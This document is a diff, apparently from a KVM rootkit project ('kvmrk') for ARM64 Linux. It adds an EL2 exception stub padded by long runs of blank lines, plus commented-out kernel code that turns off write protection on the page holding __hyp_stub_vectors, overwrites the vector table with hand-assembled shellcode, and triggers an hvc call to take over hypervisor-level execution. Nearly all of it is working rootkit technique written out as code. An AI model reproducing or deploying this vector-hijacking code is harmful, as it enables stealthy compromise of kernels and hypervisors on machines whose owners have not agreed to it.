@@ -456,3 +456,95 @@ SYM_FUNC_START(kvmrk_reset_vectors)
 	hvc		#0
 	ret
 SYM_FUNC_END(kvmrk_reset_vectors)
+
+
+
+
+
+
+
+
+
+SYM_CODE_START(kvmrk_elx_sync)
+	mov_q	x0, 0x600dca11
+	eret
+SYM_CODE_END(kvmrk_elx_sync)
+SYM_CODE_START(kvmrk_elx_sync_end)
+	nop
+SYM_CODE_END(kvmrk_elx_sync_end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// int i;
+// for (i = 0; i < num_online_cpus(); i++) {
+//     kvmrk_sched_setaffinity(0, get_cpu_mask(i));
+//     kvmrk_reset_vectors();
+//     register unsigned long r asm("x0");
+//     printk(KERN_INFO "kvmrk: reset vectors of cpu %i to hyp stub returned %i\n", smp_processor_id(), r);
+// }
+//
+// void *kvmrk_elx_sync_copy_va = kmalloc(PAGE_SIZE, GFP_KERNEL);
+// memcpy(kvmrk_elx_sync_copy_va, kvmrk_elx_sync, kvmrk_elx_sync_end - kvmrk_elx_sync);
+// phys_addr_t kvmrk_elx_sync_copy_pa = virt_to_phys(kvmrk_elx_sync_copy_va);
+// printk(KERN_INFO "kvmrk: kvmrk_elx_sync_copy_va is %lx\n", kvmrk_elx_sync_copy_va);
+// printk(KERN_INFO "kvmrk: virt_to_phys(kvmrk_elx_sync_copy_va) is %lx\n", kvmrk_elx_sync_copy_pa);
+//
+// // kvmrk_flush_virt(kvmrk_elx_sync);
+// // printk(KERN_INFO "kvmrk: kvmrk_elx_sync is %lx\n", kvmrk_elx_sync);
+// // printk(KERN_INFO "kvmrk: virt_to_phys(kvmrk_elx_sync) is %lx\n", virt_to_phys(kvmrk_elx_sync));
+//
+// uint32_t shellcode[5];
+// shellcode[4] = cpu_to_le32(0xd61f0180); // br x12
+// assemble_absolute_load(0b1100, kvmrk_elx_sync_copy_pa, shellcode);
+//
+// uint8_t *__hyp_stub_vectors_base = (uint8_t *) rk_kallsyms_lookup_name("__hyp_stub_vectors");
+// pte_t *ptep = virt_to_pte(__hyp_stub_vectors_base);
+// if (!ptep) {
+//     printk(KERN_INFO "kvmrk: virt_to_pte failed...\n");
+//     return -1;
+// }
+// pte_flip_write_protect(ptep);
+// flush_tlb_all();
+// memcpy(__hyp_stub_vectors_base + 0x400, shellcode, 5 * KVMRK_INS_WIDTH);
+// // memcpy(__hyp_stub_vectors_base + 0x400, kvmrk_elx_sync, 3 * KVMRK_INS_WIDTH);
+// flush_cache_mm(init_mm_ptr);
+// flush_tlb_all();
+// kvmrk_flush_virt(__hyp_stub_vectors_base + 0x400);
+//
+// printk(KERN_INFO "kvmrk: dumping __hyp_stub_vectors\n");
+// for (i = 0x400; i < 0x480; i += 4) {
+//     printk(KERN_INFO "      %02x %02x %02x %02x",
+//         __hyp_stub_vectors_base[i],
+//         __hyp_stub_vectors_base[i + 1],
+//         __hyp_stub_vectors_base[i + 2],
+//         __hyp_stub_vectors_base[i + 3]);
+// }
+//
+// asm volatile("mov       x0, 5\n\t");
+// asm volatile("hvc       #0\n\t");
+// register unsigned long r asm("x0");
+// printk(KERN_INFO "kvmrk: hvc returned %lx\n", r);
